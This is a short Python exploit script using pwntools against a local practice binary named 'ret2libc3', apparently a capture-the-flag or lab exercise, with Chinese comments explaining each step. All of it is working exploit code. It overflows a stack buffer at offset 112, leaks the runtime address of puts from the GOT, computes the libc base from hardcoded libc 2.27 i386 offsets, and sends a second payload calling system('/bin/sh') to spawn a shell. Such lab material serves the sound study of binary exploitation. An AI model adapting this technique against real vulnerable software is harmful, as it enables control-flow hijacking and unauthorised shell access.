from pwn import *

p = process('./ret2libc3')

offset = 112

elf = ELF('./ret2libc3')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_plt = elf.symbols['_start']

#查询得到libc版本为 libc6_2.27-3ubuntu1_i386 
libc_puts = 0x067b40
libc_system = 0x03d200
libc_bin_sh = 0x17e0cf

payload = 'a'*112 + p32(puts_plt) + p32(main_plt) + p32(puts_got) # 因为前面执行过一次puts函数，根据延迟绑定基址，这里打印puts函数的got表可以泄露puts函数真正的地址，执行完puts之后回到main函数准备下一次payload发送

p.sendlineafter("!?",payload) 

puts_addr = u32(p.recv()[0:4]) # 接受到真正puts函数在程序中的地址

libcbase = puts_addr - libc_puts # 计算偏移得到system和’/bin/sh’真正的地址
sys_addr = libcbase + libc_system
bin_sh = libcbase + libc_bin_sh

payload2 = 'a'*112 + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh) # 执行system函数getshell

p.sendline(payload2)

p.interactive()
